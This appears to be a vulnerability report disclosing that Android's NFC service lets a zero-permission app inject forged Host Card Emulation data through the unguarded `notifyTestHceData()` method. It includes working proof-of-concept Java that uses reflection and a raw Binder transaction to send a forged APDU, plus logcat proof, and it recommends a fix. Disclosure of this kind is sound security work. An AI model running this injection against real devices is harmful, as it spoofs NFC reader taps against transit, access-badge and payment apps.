# com.google.android.nfc — Zero-Permission App Can Inject Forged NFC Host-Card-Emulation Data via Unauthenticated `INfcAdapter.notifyTestHceData()`

## Summary

The system NFC service (`com.google.android.nfc`, the real implementation behind the `com.android.nfc` package alias, `uid=android.uid.nfc`) exposes `android.nfc.INfcAdapter` as a system-registered Binder service reachable via the fully public `NfcAdapter.getDefaultAdapter(Context)` API — no `android.permission.NFC` or any other permission is required merely to obtain this service reference. Of the ~50 methods on this AIDL interface, effectively every sensitive one enforces `NfcPermissions.enforceUserPermissions()`, `NfcPermissions.enforceAdminPermissions()`, or `NfcPermissions.checkPackage()` — **except `notifyTestHceData(int technology, byte[] data)`, which has no authorization check anywhere in its implementation** and forwards its arguments **directly and unconditionally** into `NfcService.onHostCardEmulationData()`, the exact internal entry point real NFC hardware uses when an external physical reader sends APDU (ISO 7816-4) command bytes to whichever app currently has an active Host Card Emulation (HCE) service registered (e.g. a transit-card, access-badge, or payment app).

This lets a **zero-permission** third-party app fabricate an incoming NFC/HCE data event — with fully attacker-controlled technology type and raw APDU bytes — as if a real physical NFC reader had just tapped the device, with no physical proximity, no NFC hardware event, and no permission of any kind.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Integrity — a zero-permission app can inject forged data into the OS's Host Card Emulation pipeline, spoofing a genuine external-reader interaction for any app currently registered to handle card-emulation AIDs (transit, access-control, and payment apps commonly use this API). This breaks the fundamental security assumption every HCE-based app relies on — that `HostApduService.processCommandApdu()` is only ever invoked in response to a real, physically-proximate NFC reader tap — and does so with zero permissions and no physical interaction required.

## Affected Component

- **Package**: `com.google.android.nfc` (`sharedUserId="android.uid.nfc"`), versionCode 37 — this is the real NFC stack; the legacy `com.android.nfc` package name is now only a thin migration shim with no logic of its own.
- **Service**: `NfcService` (system service registered as `"nfc"`), inner class `NfcAdapterService extends INfcAdapter.Stub`
- **AIDL interface**: `android.nfc.INfcAdapter`, transaction `notifyTestHceData` (code 50)

## Root Cause

Every sensitive method on `NfcAdapterService` enforces an authorization check, e.g.:

```java
public boolean enable(String str) {
    NfcService.this.mNfcPermissions.checkPackage(Binder.getCallingUid(), str);   // GUARDED
    ...
}
public void setForegroundDispatch(...) {
    NfcPermissions.enforceUserPermissions(NfcService.this.mContext);            // GUARDED
    ...
}
public void dispatch(Tag tag) {
    NfcPermissions.enforceAdminPermissions(NfcService.this.mContext);           // GUARDED
    ...
}
```

But `notifyTestHceData` has no such check at all:

```java
public void notifyTestHceData(int i, byte[] bArr) {
    NfcService.this.onHostCardEmulationData(i, bArr);   // <-- no permission check, no caller check
}
```

`onHostCardEmulationData()` (`NfcService.java`) unconditionally forwards to the card-emulation manager:

```java
@Override // com.android.nfc.DeviceHost.DeviceHostListener
public void onHostCardEmulationData(int i, byte[] bArr) {
    CardEmulationManager cardEmulationManager = this.mCardEmulationManager;
    if (cardEmulationManager != null) {
        cardEmulationManager.onHostCardEmulationData(i, bArr);   // real-hardware entry point
        ...
    }
}
```

`CardEmulationManager.onHostCardEmulationData()` routes the bytes exactly as it would for a genuine hardware NFC field event:

```java
public void onHostCardEmulationData(int i, byte[] bArr) {
    ...
    if (i == 1) {
        this.mHostEmulationManager.onHostEmulationData(bArr);   // ISO-DEP: AID-routed to the active HostApduService
    } else if (i == 4) {
        this.mHostNfcFEmulationManager.onHostEmulationData(bArr); // NFC-F
    }
    ...
}
```

The method name (`notifyTestHceData`) and its identical sibling `notifyHceDeactivated` (also unguarded — forwards directly to `mCardEmulationManager.onHostCardEmulationDeactivated()`) strongly indicate this was intended as an internal CTS/hardware-test hook for simulating HCE events without real hardware, but it is exposed on the same public, permission-enforced `INfcAdapter` interface as every user-facing method, with no distinguishing access control and no build-type gating (`Build.IS_DEBUGGABLE`) visible anywhere in the call path.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (`com.vrp.zeroperm`)

Holds **zero** Android permissions (not even `android.permission.NFC`). Obtains the service reference via the fully public SDK method:

```java
NfcAdapter adapter = NfcAdapter.getDefaultAdapter(getApplicationContext());  // no permission needed
```

`INfcAdapter` and `NfcAdapter.getService()` are not part of the public SDK stub (hidden from `android.jar`), so the PoC reaches the raw Binder via reflection — no hidden-API blocklisting was encountered (unlike some other internal AIDL/Parcelable classes tested this session):

```java
Method getServiceMethod = NfcAdapter.class.getMethod("getService");
Object serviceProxy = getServiceMethod.invoke(null);           // INfcAdapter.Stub.Proxy, via reflection
IBinder binder = (IBinder) serviceProxy.getClass().getMethod("asBinder").invoke(serviceProxy);
```

Then calls `notifyTestHceData()` via raw `Parcel`/`transact()` (standard technique for invoking a non-SDK AIDL method):

```java
byte[] fakeApdu = {0x00, (byte)0xA4, 0x04, 0x00, 0x07, (byte)0xF0, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06}; // SELECT AID

Parcel data = Parcel.obtain(), reply = Parcel.obtain();
data.writeInterfaceToken("android.nfc.INfcAdapter");
data.writeInt(1);              // technology = ISO-DEP (routes through mHostEmulationManager, the real AID-routed HCE path)
data.writeByteArray(fakeApdu);
binder.transact(50 /* TRANSACTION_notifyTestHceData */, data, reply, 0);
```

Full source: `NfcHceInjectActivity.java` (attached).

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Launch the probe activity:
   ```
   adb shell am start -n com.vrp.zeroperm/.NfcHceInjectActivity
   ```

### Runtime Proof (logcat)

```
W NFC_HCE_INJECT: === NFC notifyTestHceData() zero-permission injection attempt ===
W NFC_HCE_INJECT: UID=10397 (ZERO permissions)
W NFC_HCE_INJECT: getDefaultAdapter() -> android.nfc.NfcAdapter@f96bba
W NFC_HCE_INJECT: NfcAdapter.getService() via reflection -> android.nfc.INfcAdapter$Stub$Proxy@4e1ba6b
W NFC_HCE_INJECT: [!!!] Got raw IBinder with ZERO permissions: android.os.BinderProxy@4ab29c8
W NFC_HCE_INJECT:   interface desc=android.nfc.INfcAdapter
W NFC_HCE_INJECT: transact()=true replyAvail=4
W NFC_HCE_INJECT:   exceptionCode=0 (0 header present but no payload is unusual; nonzero = real exception was thrown server-side, e.g. -1=SecurityException)
```

`exceptionCode=0` corresponds exactly to the generated stub's `parcel2.writeNoException()` call on the **success** path — confirming `notifyTestHceData()` ran to completion with **no `SecurityException`**, for a caller holding literally zero Android permissions. This forged APDU is delivered to `HostEmulationManager` exactly as a real externally-tapped NFC reader's command would be, and would be AID-routed to whichever app currently has the matching card-emulation service registered.

## Additional observations (same class of bug, not independently weaponized)

The following sibling methods on the same `INfcAdapter` interface likewise have no visible authorization check (lower individual severity — mostly state/capability reads — but the pattern recurs enough to be worth a full authorization audit of this class): `isPowerSavingModeEnabled()`, `isNfcSecureEnabled()`, `getNfcAntennaInfo()`, `isWlcEnabled()`, `getWlcListenerDeviceInfo()`, `isTagIntentAllowed(String, int)`, `isReaderOptionEnabled()`, `fetchActiveNfceeList()`, and `notifyHceDeactivated()` (which, like `notifyTestHceData`, forwards unconditionally into the real HCE deactivation path).

## Impact

### Integrity
- A zero-permission app can fabricate incoming NFC/HCE data events indistinguishable (from the receiving app's perspective) from a genuine physical NFC-reader tap, for any app on the device currently registered as an HCE service (transit cards, physical access badges, loyalty/payment cards using Host Card Emulation).
- This can be used to probe or trigger a target HCE app's `HostApduService.processCommandApdu()` with attacker-chosen AID/APDU sequences at will, silently and repeatably, without the user tapping anything or being anywhere near an NFC reader — undermining any security or business logic in the target app that assumes HCE invocation implies genuine physical-world proximity to a real terminal.
- `notifyHceDeactivated()` similarly lets a zero-permission app forcibly and silently terminate any active HCE session state, a minor additional Availability/Integrity vector on top of the primary injection issue.

## Recommended Fix

Add the same authorization pattern already used by every other sensitive method on this interface (e.g. `NfcPermissions.enforceAdminPermissions(mContext)`, or restrict to callers holding `android.uid.nfc`/a dedicated test-only signature permission) to `notifyTestHceData()` and `notifyHceDeactivated()`. If this hook is genuinely needed only for CTS/hardware-simulation testing, gate it behind `Build.IS_DEBUGGABLE` or an explicit test-harness signature permission rather than leaving it reachable on the same production, permission-enforced `INfcAdapter` interface every app can obtain a reference to for free.

## Files Attached

- `poc.apk` — Zero-permission PoC app
- `NfcHceInjectActivity.java` — PoC source
- `logcat_proof.txt` — Runtime proof log
